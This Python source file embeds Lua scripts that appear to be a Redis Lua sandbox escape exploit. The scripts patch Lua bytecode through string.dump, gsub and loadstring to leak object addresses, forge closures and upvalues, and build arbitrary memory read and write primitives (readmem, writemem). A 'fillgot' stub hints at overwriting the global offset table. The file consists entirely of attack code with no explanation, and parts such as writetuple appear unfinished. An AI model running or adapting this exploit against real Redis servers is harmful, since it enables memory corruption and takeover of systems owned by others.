# -*- coding:utf-8 -*-
readmem = r'''
   local TSTRING = 0x4 local TNUMBER = 0x3 local TTABLE = 0x5 local TPROTO = 0x9
   local function b(x) return string.char(x) end
   local function ub(x, y)
     local str = ''
     for i = 1,y,1 do
       local n = x % 256
       str = str .. b(n)
       x = (x - n) / 256
     end
     return str
   end
   local function unpack32bit(x, fmt)
     local tb = {}
     local rt = {}
     for i = 1, 4 do
       local n = x % 256
       tb[i] = n
       x = (x - n) / 256
     end
     local y = 1
     for i = 1, #fmt do
       if fmt[i] == 1 then
         rt[i] = tb[y]
         y = y + 1
       end
       if fmt[i] == 2 then
     rt[i] = tb[y] + tb[y + 1] * 256
         y = y + 2
       end
       if fmt[i] == 4 then
         return {x}
       end
     end
     return rt
   end 
   local forloop = loadstring((string.dump(function(x)
     for i = x, x, 0 do
       return i
     end
   end):gsub("\96%z%z\128", "\22\0\0\128")))
   local function f2u(x)
     if x == nil then return 0, 0 end
     if x == 0 then return 0, 0 end
     if x < 0 then x = -x end
     local e_lo, e_hi, e, m = -1075, 1023
     while true do
       e = (e_lo + e_hi)
       e = (e - (e % 2)) / 2
       m = x / 2^e
       if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
     end
     if e+1023 <= 1 then
       m = m * 2^(e+1074)
       e = 0
     else
       m = (m - 0.5) * 2^53
       e = e + 1022
     end
     local lo = m % 2^32
     m = (m - lo) / 2^32
     local hi = m + e * 2^20
     return lo, hi
   end
   local function u2f(lo, hi)
     local m = hi % 2^20
     local e = (hi - m) / 2^20
     m = m * 2^32 + lo  
     if e ~= 0 then
       m = m + 2^52
     else
       e = 1
     end
     return m * 2^(e-1075)
   end
   local function addrof(x)
     return f2u(forloop(x))
   end
   redis["addrof"] = function(x)
     return f2u(forloop(x))
   end
   redis["msg"] = ""
   local function pushmsg(msg)
     redis["msg"] = redis["msg"] .. msg .. "\r\n"  
   end
   local function ub4(x)
     return ub(x, 4)
   end
   local function ub8(x)
     return ub(x, 8)
   end
   local function saddrof(x)
     return addrof(x) + 0x18
   end
   local function TValue(n, tt)
     return ub8(n) .. ub4(tt)
   end
   local function TNumber(n)
     return TValue(n, TNUMBER)
   end
   local function TString(size)
     return ub8(0) .. b(TSTRING) .. b(2) .. "\0\0\0\0\0\0" .. ub8(size) .. "TSTRING"
   end
   local function UpVal(tt, tv)
     return ub8(0) .. b(tt) .. b(2) .. "\0\0\0\0\0\0" .. ub8(tv)
   end
   local function Table()
     return ub8(0) .. b(TTABLE) .. b(2) .. "\0\0\0\0\0\0" .. ub8(0):rep(6)
   end
   local function Proto(k)
     local tb = {}
     return ub8(0) .. b(TPROTO) .. b(1) .. "\0\0\0\0\0\0" .. ub8(k) .. ub8(0):rep(16) .. "AAAABBBB"
   end
   redis["LC"] = function()
         local proto = Proto(saddrof(TNumber(0)))
         local upval = UpVal(TNUMBER, redis["mem_addr"])
         return ub8(saddrof(Table())) .. ub8(saddrof(Proto)) .. ub8(0) .. ub8(saddrof(upval))
   end
   local reader = loadstring(string.dump(function()
     local upval_1 = nil
     local LClosure = nil
     local function f0()
       local function f1()
         LClosure = redis["LC"]()
       end
       local function safe(v)
       redis["mem_chunk_l"], redis["mem_chunk_h"]  = redis["addrof"](v)
       end
       f1()
       safe(upval_1)
     end
     f0()
   end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))
   local function readmem(addr)
     redis["mem_addr"] = addr
     redis["mem_chunk_l"] = 0 redis["mem_chunk_h"] = 0
     reader()
     return redis["mem_chunk_l"], redis["mem_chunk_h"]
   end
   return {readmem(ARGV[1])}
 '''

writemem = r'''
  local TSTRING = 0x4 local TNUMBER = 0x3 local TTABLE = 0x5 local TPROTO = 0x9
  local function b(x) return string.char(x) end
  local function ub(x, y)
    local str = ''
    for i = 1,y,1 do
      local n = x % 256
      str = str .. b(n)
      x = (x - n) / 256
    end
    return str
  end
  local function unpack32bit(x, fmt)
    local tb = {}
    local rt = {}
    for i = 1, 4 do
      local n = x % 256
      tb[i] = n
      x = (x - n) / 256
    end
    local y = 1
    for i = 1, #fmt do
      if fmt[i] == 1 then
        rt[i] = tb[y]
        y = y + 1
      end
      if fmt[i] == 2 then
	rt[i] = tb[y] + tb[y + 1] * 256
        y = y + 2
      end
      if fmt[i] == 4 then
        return {x}
      end
    end
    return rt
  end 
  local forloop = loadstring((string.dump(function(x)
    for i = x, x, 0 do
      return i
    end
  end):gsub("\96%z%z\128", "\22\0\0\128")))
  local function f2u(x)
    if x == nil then return 0, 0 end
    if x == 0 then return 0, 0 end
    if x < 0 then x = -x end
    local e_lo, e_hi, e, m = -1075, 1023
    while true do
      e = (e_lo + e_hi)
      e = (e - (e % 2)) / 2
      m = x / 2^e
      if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
    end
    if e+1023 <= 1 then
      m = m * 2^(e+1074)
      e = 0
    else
      m = (m - 0.5) * 2^53
      e = e + 1022
    end
    local lo = m % 2^32
    m = (m - lo) / 2^32
    local hi = m + e * 2^20
    return lo, hi
  end
  local function u2f(lo, hi)
    local m = hi % 2^20
    local e = (hi - m) / 2^20
    m = m * 2^32 + lo  
    if e ~= 0 then
      m = m + 2^52
    else
      e = 1
    end
    return m * 2^(e-1075)
  end
  local function addrof(x)
    return f2u(forloop(x))
  end
  redis["addrof"] = function(x)
    return f2u(forloop(x))
  end
  redis["msg"] = ""
  local function pushmsg(msg)
    redis["msg"] = redis["msg"] .. msg .. "\r\n"  
  end
  local function ub4(x)
    return ub(x, 4)
  end
  local function ub8(x)
    return ub(x, 8)
  end
  local function saddrof(x)
    return addrof(x) + 0x18
  end
  local function TValue(n, tt)
    return ub8(n) .. ub4(tt)
  end
  local function TNumber(n)
    return TValue(n, TNUMBER)
  end
  local function TString(size)
    return ub8(0) .. b(TSTRING) .. b(2) .. "\0\0\0\0\0\0" .. ub8(size) .. "TSTRING"
  end
  local function UpVal(tt, tv)
    return ub8(0) .. b(tt) .. b(2) .. "\0\0\0\0\0\0" .. ub8(tv)
  end
  local function Table()
    return ub8(0) .. b(TTABLE) .. b(2) .. "\0\0\0\0\0\0" .. ub8(0):rep(6)
  end
  local function Proto(k)
    local tb = {}
    return ub8(0) .. b(TPROTO) .. b(1) .. "\0\0\0\0\0\0" .. ub8(k) .. ub8(0):rep(16) .. "AAAABBBB"
  end
  redis["LC"] = function()
        local proto = Proto(saddrof(TNumber(0)))
        local upval = UpVal(TNUMBER, redis["mem_addr"])
        return ub8(saddrof(Table())) .. ub8(saddrof(Proto)) .. ub8(0) .. ub8(saddrof(upval))
  end
  
  redis["LC1"] = function()
        local proto = Proto(saddrof(TNumber(0)))
	local adr = addrof(redis["memview"])
        local tb = ub8(adr) .. b(TTABLE) .. b(2) .. "\0\0\0\0\0\0" .. ub8(adr + 16) .. ub8(adr + 24) .. ub8(adr + 32) .. ub8(0) .. ub8(0) .. ub4(1)
        local tv = TValue(saddrof(tb), TTABLE)
        local upval = UpVal(TSTRING, saddrof(tv))
        return ub8(saddrof(Table())) .. ub8(saddrof(Proto)) .. ub8(0) .. ub8(saddrof(upval))
  end
  local writer = loadstring(string.dump(function()
    local upval_1 = nil
    local LClosure = nil
    local function f0()
      local function f1()
        LClosure = redis["LC1"]()
      end
      local function safe(v)
	  v[1] = redis["mem_addr"]
	  redis["memview"][1] = redis["chunk_write"]
          v[1] = nil  --设置table的node属性为0,防止调用垃圾回收机制时崩溃
      end
      f1()
      safe(upval_1)
    end
    f0()
  end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))
  local function writemem(addr_l, addr_h, val_l, val_h)
    redis["memview"] = {0}
    redis["chunk_write"] = u2f(val_l, val_h)
    redis["mem_addr"] = u2f(addr_l, addr_h)
    writer()
  end
  writemem(ARGV[1], ARGV[2], ARGV[3], ARGV[4])
  return 0
'''

fillgot = r'''
    return tonumber("666", 8)
'''

writetuple = r'''
  local TSTRING = 0x4 local TNUMBER = 0x3 local TTABLE = 0x5 local TPROTO = 0x9
  local function b(x) return string.char(x) end
  local function ub(x, y)
    local str = ''
    for i = 1,y,1 do
      local n = x % 256
      str = str .. b(n)
      x = (x - n) / 256
    end
    return str
  end
  local function unpack32bit(x, fmt)
    local tb = {}
    local rt = {}
    for i = 1, 4 do
      local n = x % 256
      tb[i] = n
      x = (x - n) / 256
    end
    local y = 1
    for i = 1, #fmt do
      if fmt[i] == 1 then
        rt[i] = tb[y]
        y = y + 1
      end
      if fmt[i] == 2 then
	rt[i] = tb[y] + tb[y + 1] * 256
        y = y + 2
      end
      if fmt[i] == 4 then
        return {x}
      end
    end
    return rt
  end 
  local forloop = loadstring((string.dump(function(x)
    for i = x, x, 0 do
      return i
    end
  end):gsub("\96%z%z\128", "\22\0\0\128")))
  local function f2u(x)
    if x == nil then return 0, 0 end
    if x == 0 then return 0, 0 end
    if x < 0 then x = -x end
    local e_lo, e_hi, e, m = -1075, 1023
    while true do
      e = (e_lo + e_hi)
      e = (e - (e % 2)) / 2
      m = x / 2^e
      if m < 0.5 then e_hi = e elseif 1 <= m then e_lo = e else break end
    end
    if e+1023 <= 1 then
      m = m * 2^(e+1074)
      e = 0
    else
      m = (m - 0.5) * 2^53
      e = e + 1022
    end
    local lo = m % 2^32
    m = (m - lo) / 2^32
    local hi = m + e * 2^20
    return lo, hi
  end
  local function u2f(lo, hi)
    local m = hi % 2^20
    local e = (hi - m) / 2^20
    m = m * 2^32 + lo  
    if e ~= 0 then
      m = m + 2^52
    else
      e = 1
    end
    return m * 2^(e-1075)
  end
  local function addrof(x)
    return f2u(forloop(x))
  end
  redis["addrof"] = function(x)
    return f2u(forloop(x))
  end
  redis["msg"] = ""
  local function pushmsg(msg)
    redis["msg"] = redis["msg"] .. msg .. "\r\n"  
  end
  local function ub4(x)
    return ub(x, 4)
  end
  local function ub8(x)
    return ub(x, 8)
  end
  local function saddrof(x)
    return addrof(x) + 0x18
  end
  local function TValue(n, tt)
    return ub8(n) .. ub4(tt)
  end
  local function TNumber(n)
    return TValue(n, TNUMBER)
  end
  local function TString(size)
    return ub8(0) .. b(TSTRING) .. b(2) .. "\0\0\0\0\0\0" .. ub8(size) .. "TSTRING"
  end
  local function UpVal(tt, tv)
    return ub8(0) .. b(tt) .. b(2) .. "\0\0\0\0\0\0" .. ub8(tv)
  end
  local function Table()
    return ub8(0) .. b(TTABLE) .. b(2) .. "\0\0\0\0\0\0" .. ub8(0):rep(6)
  end
  local function Proto(k)
    local tb = {}
    return ub8(0) .. b(TPROTO) .. b(1) .. "\0\0\0\0\0\0" .. ub8(k) .. ub8(0):rep(16) .. "AAAABBBB"
  end
  redis["LC"] = function()
        local proto = Proto(saddrof(TNumber(0)))
        local upval = UpVal(TNUMBER, redis["mem_addr"])
        return ub8(saddrof(Table())) .. ub8(saddrof(Proto)) .. ub8(0) .. ub8(saddrof(upval))
  end

  redis["LC1"] = function()
        local proto = Proto(saddrof(TNumber(0)))
	local adr = addrof(redis["memview"])
        local tb = ub8(adr) .. b(TTABLE) .. b(2) .. "\0\0\0\0\0\0" .. ub8(adr + 16) .. ub8(adr + 24) .. ub8(adr + 32) .. ub8(0) .. ub8(0) .. ub4(1)
        local tv = TValue(saddrof(tb), TTABLE)
        local upval = UpVal(TSTRING, saddrof(tv))
        return ub8(saddrof(Table())) .. ub8(saddrof(Proto)) .. ub8(0) .. ub8(saddrof(upval))
  end
  local writer = loadstring(string.dump(function()
    local upval_1 = nil
    local LClosure = nil
    local function f0()
      local function f1()
        LClosure = redis["LC1"]()
      end
      local function safe(v)
	  v[1] = redis["mem_addr"]
	  redis["memview"][1] = redis["chunk_write"]
          v[1] = nil  --设置table的node属性为0,防止调用垃圾回收机制时崩溃
      end
      f1()
      safe(upval_1)
    end
    f0()
  end):gsub("(\164%z%z%z)....", "%1\0\0\128\1", 1))
  local function writemem(addr_l, addr_h, val_l, val_h)
    redis["memview"] = {0}
    redis["chunk_write"] = u2f(val_l, val_h)
    redis["mem_addr"] = u2f(addr_l, addr_h)
    writer()
  end
  collectgarbage("stop", 0)
'''

